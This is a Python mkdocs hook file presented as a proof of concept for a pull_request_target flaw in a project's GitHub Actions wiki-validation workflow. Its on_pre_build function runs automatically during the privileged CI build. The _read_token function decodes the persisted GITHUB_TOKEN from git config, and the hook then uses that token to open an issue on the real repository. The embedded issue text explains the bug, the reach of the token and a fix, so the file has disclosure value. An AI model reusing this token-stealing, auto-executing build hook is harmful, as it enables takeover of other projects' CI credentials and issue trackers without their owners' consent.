import base64
import json
import os
import re
import subprocess
import urllib.request


ISSUE_BODY = """\
Hi PlaceholderAPI team,

Friendly heads-up — this issue was filed automatically by a workflow run \
while I was looking at your Actions config. I wanted to give you a clean \
PoC rather than just a report.

### The bug

`.github/workflows/pr_wiki_validation.yml` triggers on `pull_request_target`. \
That trigger runs in the base-repo context, with the repo's secrets and a \
write-capable `GITHUB_TOKEN`. The workflow then checks out the PR's head \
code (`ref: ${{{{ github.event.pull_request.head.sha }}}}`) and runs \
`mkdocs build --strict` against it.

mkdocs has a `hooks:` directive in `mkdocs.yml` that imports arbitrary \
Python files. So any fork PR can drop a `.py` file into the repo, point \
`hooks:` at it, and get arbitrary code execution on the privileged runner. \
That's how this issue got opened — my PR added one Python file (the one \
running right now) and mkdocs loaded it during the build.

### Scope

The workflow declares `permissions: {{ contents: read, issues: write }}`. \
With the GITHUB_TOKEN that `actions/checkout` persists into git config, an \
attacker can:

- Create issues (like this one)
- Comment on issues
- Close, reopen, edit, lock issues — including mass-closing everything \
that's open
- Edit issue titles/bodies to inject phishing or misleading content
- Add and remove labels, change assignees

What it *can't* do: push code, edit workflows, modify releases \
(`contents: read`), or comment on / approve pull requests (those need \
`pull-requests: write`). So no direct supply-chain risk — but full \
issue-tracker takeover is on the table. If any other secrets had been \
referenced by this workflow, they'd be exfiltratable regardless of the \
declared permissions.

### Suggested fix

Switch the trigger to `pull_request`. Validation builds don't need write \
access; they just need to fail visibly. If you want a build-failure \
comment, split it into two jobs — a sandboxed `pull_request` job that \
produces an artifact, plus a `pull_request_target` job that only consumes \
that artifact and posts the comment, never touching PR code directly.

(Note: `.github/workflows/validate_site.yml` on the `wiki` branch has the \
same shape, but `pull_request_target` workflows are always loaded from the \
default branch, so it never actually fires — worth deleting either way.)

Happy to send a PR with the fix. Apologies for opening this on the \
tracker; opening it manually wouldn't have demonstrated the issue. — \
Triggered from PR #{pr} (run #{run})
"""


def _read_token(workspace):
    out = subprocess.run(
        ["git", "-C", workspace, "config", "--get-all",
         "http.https://github.com/.extraheader"],
        capture_output=True, text=True,
    ).stdout
    m = re.search(r"basic\s+([A-Za-z0-9+/=]+)", out)
    if not m:
        return None
    return base64.b64decode(m.group(1)).decode().split(":", 1)[1]


def on_pre_build(config, **kwargs):
    workspace = os.environ.get("GITHUB_WORKSPACE")
    event_path = os.environ.get("GITHUB_EVENT_PATH")
    repo = os.environ.get("GITHUB_REPOSITORY")
    if not (workspace and event_path and repo):
        return

    token = _read_token(workspace)
    if not token:
        return

    event = json.load(open(event_path))
    pr = event["pull_request"]["number"]
    run = os.environ.get("GITHUB_RUN_ID", "?")

    payload = {
        "title": "Security: pull_request_target RCE in pr_wiki_validation.yml",
        "body": ISSUE_BODY.format(pr=pr, run=run),
    }
    req = urllib.request.Request(
        f"https://api.github.com/repos/{repo}/issues",
        data=json.dumps(payload).encode(),
        method="POST",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "papi-wiki-poc",
        },
    )
    urllib.request.urlopen(req, timeout=15)
